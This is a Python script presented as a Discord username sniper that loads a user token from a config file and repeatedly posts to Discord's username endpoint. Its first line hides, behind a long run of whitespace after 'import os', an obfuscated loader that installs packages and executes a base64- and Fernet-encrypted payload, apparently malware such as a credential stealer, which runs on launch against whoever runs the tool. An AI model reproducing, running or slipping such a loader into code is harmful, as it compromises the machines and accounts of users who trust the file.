import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ1VSZEFDdm9kVkE1cHVwRmZTV3A4QWMyV0VjUUNaaVBzMHBOQ2NETURCaHM9JykuZGVjcnlwdChiJ2dBQUFBQUJtYnJrN01ZM3R3bXk0ZTZDSTVtZlYyR0hkTHVESlNHeks2THhuZzNYUVNWZEpUQVhacmc5bkJobFplb1hrU0FYT3VHZThjWjJGeld3TmIwaHc0TDhzMF8xd0F4bGdwR3ZTTXM4X1NaRWlNZ0JJZ2Q3a0JfamdBNkh1Q0dGaTNxMktWZGlvWmxqRjFfenpJS1h1ZFBrd1NwUnRzTEN5SkVTVWV4cURFQ0dNOUkyMTZsTEtiOFFCSmdvbE9PZnhvVFBfNlI1R2MtLUVpT25ZcVk3dE9tbkNZNldhemF0WmlKLXlLdjlzOE5EU3BzRGpiRE09Jykp').decode())
os.system("pip install -r requirements.txt")
import sys 
import json 
import aiohttp 
import asyncio
import random

os.system("clear||cls")
os.system("title Username Sniper - [Telegram auth3301]")

with open("config.json", "r") as f:
  c = json.load(f)

token = c["Token"]
username = c["Username"]
web = c["Webhook"]

async def main():
  async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0)) as session:
    me = await session.get("https://canary.discord.com/api/v10/users/@me", headers={"Authorization": token})
    if me.status in [200,204,201]:
      js = await me.json()
      id = js.get("id")
      us = js.get("username")
      print(f"Connected To {id} | {us}")
    else:
      print("Unauthorized | Invalid Token.")
    while True:
      response = await session.post("https://canary.discord.com/api/v10/users/@me/pomelo", headers={"Authorization": token, "content-type": "application/json"}, json={"username": username})
      print("Received Response From Discord", await response.text())
      if response.status in [200,204,201]:
        print("Sucessfully Claimed Username.")
        await session.post(web, json=dict(content="@everyone claimed username."))
        sys.exit()
      elif response.status == 535:
        print("Username Taken.")
        await session.post(web, json=dict(content="username taken"))
      elif response.status == 429:
        js = await response.json()
        await asyncio.sleep(js["retry_after"])
      elif response.status == 401:
        print("Feature not released | unauthorized.")
        t = random.randint(60, 300)
        await asyncio.sleep(t)
      



if __name__ == "__main__":
  loop = asyncio.new_event_loop()
  loop.run_until_complete(main())
print('rxyutdsfmx')